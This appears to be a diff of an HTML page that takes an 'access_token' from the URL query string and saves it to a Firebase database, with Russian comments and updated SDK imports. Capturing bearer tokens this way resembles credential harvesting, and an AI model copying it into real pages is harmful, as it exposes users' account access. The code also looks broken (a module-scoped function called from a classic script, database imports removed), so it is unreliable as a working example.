@@ -1,18 +1,15 @@
-<html>
+ <html>
   <head>
-    <script type="text/javascript">
-      const urlParamsV2Params = new URLSearchParams(window.location.search);
-const access_token = urlParamsV2Params.get('access_token');
-
-if (access_token) {
-  saveText(access_token);
-}
-
-    </script>
-    <script type="module">
+  <script type="module">
       // Подключаем необходимые функции из Firebase CDN (актуально для 2026)
-  import { initializeApp } from "https://www.gstatic.com";
-  import { getDatabase, ref, push, set } from "https://www.gstatic.com";
+  import { initializeApp } from 'https://www.gstatic.com/firebasejs/12.8.0/firebase-app.js'
+
+    // If you enabled Analytics in your project, add the Firebase SDK for Google Analytics
+    import { getAnalytics } from 'https://www.gstatic.com/firebasejs/12.8.0/firebase-analytics.js'
+
+    // Add Firebase products that you want to use
+    import { getAuth } from 'https://www.gstatic.com/firebasejs/12.8.0/firebase-auth.js'
+    import { getFirestore } from 'https://www.gstatic.com/firebasejs/12.8.0/firebase-firestore.js'
 
   // Конфигурация вашего проекта (возьмите её в настройках проекта Firebase)
   const firebaseConfig = {
@@ -39,6 +36,16 @@ if (access_token) {
       console.error("Ошибка при записи:", error);
     }
   }
+    </script>
+
+        <script type="text/javascript">
+      const urlParamsV2Params = new URLSearchParams(window.location.search);
+const access_token = urlParamsV2Params.get('access_token');
+
+if (access_token) {
+  saveText(access_token);
+}
+
     </script>
   </head>
 </html>
